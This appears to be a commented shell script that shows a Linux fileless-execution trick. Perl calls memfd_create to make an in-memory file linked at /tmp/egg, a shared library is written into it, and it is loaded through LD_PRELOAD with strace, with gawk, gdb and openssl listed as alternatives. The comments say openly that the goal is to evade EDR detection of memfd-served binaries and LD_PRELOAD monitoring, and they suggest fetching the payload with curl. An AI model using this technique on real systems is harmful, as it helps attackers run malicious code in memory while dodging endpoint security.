# create a memfd. can do this with most scripting languages
# we really only want this to live for a short time as detections look for ELFs
# being served by memfds.
# (see:
# https://sandflysecurity.com/blog/detecting-bincrypter-linux-malware-obfuscation )
#
# however if it exists for only a short period of time, as tbe dynamic loader
# doesn't need it to exist forever, you bypass that detection for agentic
# approaches that don't read every single memfd (terrible idea to implement in
# an EDR for perf reasons)
# only other consideration is finding a good lolbin for your dlopen() call.
rm /tmp/egg
echo '$name = "egg"; $fd = syscall(319, $name, 1); $path = "/proc/" . $$ . "/fd/" . $fd; symlink($path, "/tmp/egg"); chmod 0666, $path; sleep 5; unlink "/tmp/egg"' | perl &

# so we have time for the memfd to exist
sleep 0.5
# EGG=`find /proc -maxdepth 4 -lname \*egg\* 2>/dev/null`
EGG=/tmp/egg

# dump what we want into the menfd
# maybe curl it, extract from log files, etc
cat ./lib/libfoo.so > $EGG

# load the memfd through a tool that'll dlopen() what we want.
# we have a lot of options:
# * gawk
# * bash
# * ssh-keygen
# * LD_PRELOAD
# * and even more
# https://gtfobins.github.io/#+library%20load
# just note that you might need specific symbols defined

# gawk
# echo $EGG | xargs -I {} gawk -e '@load "{}"' /dev/random || true

# LD_PRELOAD
# pretty easy to detect, as you can just iterate through the running processes
# environ's to find this.
#LD_PRELOAD=$EGG python3
# this is a dumb trick as a bunch of EDR rules don't consider LD_PRELOAD being
# changed except via the shell. (lol)
#python3  << __FUN__
#import subprocess
#myenv = {'LD_PRELOAD': '/tmp/egg'}
#process = subprocess.Popen(['env'], shell=False, env = myenv)
#__FUN__
# LD_PRELOAD=/tmp/egg cat /proc/self/maps
# LD_PRELOAD=/tmp/egg tail -f /dev/null

strace -E LD_PRELOAD=/tmp/egg tail -f /dev/null
# gdb -ex "set environment LD_PRELOAD /tmp/egg" -ex "r" /bin/ls

# # openssl
# openssl req -engine $EGG || true
